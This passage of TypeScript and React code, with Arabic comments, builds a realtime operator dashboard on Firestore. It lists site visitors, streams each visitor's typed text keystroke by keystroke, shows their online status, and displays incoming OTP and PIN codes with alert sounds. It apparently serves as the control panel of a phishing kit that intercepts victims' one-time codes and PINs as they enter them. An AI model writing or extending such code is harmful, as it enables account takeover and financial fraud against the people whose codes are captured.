  audio.play().catch(() => {});

2) ملف: lib/realtime.ts

import { onSnapshot, doc, collection, query, orderBy, limit } from "firebase/firestore";
import { db } from "./firebase"; // تأكد هذا نفس db المستخدم بالمشروع
// ✅ حضور (متصل/غير متصل)
export const listenPresence = (userId: string, cb: (online: boolean, lastSeen?: any) => void) => {
  const ref = doc(db, "presence", userId);
  return onSnapshot(ref, (snap) => {
    const d = snap.data();
    cb(!!d?.online, d?.lastSeen);
  });
};
// ✅ typing حرف بحرف (يجي من الموقع)
export const listenTyping = (visitorId: string, cb: (text: string) => void) => {
  const ref = doc(db, "typing", visitorId);
  return onSnapshot(ref, (snap) => {
    cb((snap.data()?.text as string) || "");
  });
};
// ✅ أكواد OTP/PIN لحظي
export const listenCodes = (visitorId: string, cb: (codes: any[]) => void) => {
  const ref = collection(db, "visitors", visitorId, "codes");
  const q = query(ref, orderBy("createdAt", "desc"), limit(20));
  return onSnapshot(q, (snap) => {
    cb(snap.docs.map(d => ({ id: d.id, ...d.data() })));
  });
};
// ✅ زوار realtime
export const listenVisitors = (cb: (rows: any[]) => void) => {
  const ref = collection(db, "visitors");
  const q = query(ref, orderBy("createdAt", "desc"), limit(50));
  return onSnapshot(q, (snap) => {
    cb(snap.docs.map(d => ({ id: d.id, ...d.data() })));
  });
};

3) مكان التركيب في app/notifications/page.tsx

ينحط داخل الـ component الرئيسي:

* state للـ visitors / selectedVisitor / codes / typing / online
* useEffect للـ onSnapshot
* تشغيل الأصوات عند تغيّر البيانات

import { useEffect, useRef, useState } from "react";
import { playSound } from "@/lib/sounds";
import { listenVisitors, listenCodes, listenTyping, listenPresence } from "@/lib/realtime";
export default function NotificationsPage() {
  const [visitors, setVisitors] = useState<any[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [codes, setCodes] = useState<any[]>([]);
  const [typingText, setTypingText] = useState("");
  const [online, setOnline] = useState(false);
  const lastCodeIdRef = useRef<string | null>(null);
  // ✅ زوار realtime
  useEffect(() => {
    const unsub = listenVisitors((rows) => {
      // صوت دخول زائر جديد
      if (rows[0]?.id && visitors[0]?.id && rows[0].id !== visitors[0].id) {
        playSound("visitor");
      }
      setVisitors(rows);
    });
    return () => unsub();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);
  // ✅ لما تختار زائر: شغل listeners
  useEffect(() => {
    if (!selectedId) return;
    const unsubCodes = listenCodes(selectedId, (arr) => {
      // صوت OTP/PIN لو وصل جديد
      if (arr[0]?.id && lastCodeIdRef.current && arr[0].id !== lastCodeIdRef.current) {
        const type = (arr[0].type || "").toLowerCase();
        if (type === "otp") playSound("otp");
        if (type === "pin") playSound("pin");
      }
      lastCodeIdRef.current = arr[0]?.id || null;
      setCodes(arr);
    });
    const unsubTyping = listenTyping(selectedId, (t) => setTypingText(t));
    const unsubPresence = listenPresence(selectedId, (isOnline) => setOnline(isOnline));
    return () => {
      unsubCodes();
      unsubTyping();
      unsubPresence();
    };
  }, [selectedId]);
  // هنا UI حقك…
  return (
    <div className="min-h-screen">
      {/* مثال: حالة الاتصال */}
      <div className="px-4 py-2">
        <span className={online ? "text-green-600" : "text-gray-500"}>
          {online ? "متصل" : "غير متصل"}
        </span>
      </div>
      {/* مثال: typing حرف بحرف */}
      <div className="px-4 py-2">
        <div className="text-sm text-gray-600">يكتب الآن:</div>
        <div className="font-mono">{typingText}</div>
      </div>
      {/* لازم عندك قائمة زوار وتعمل setSelectedId عند الضغط */}
    </div>
  );
}
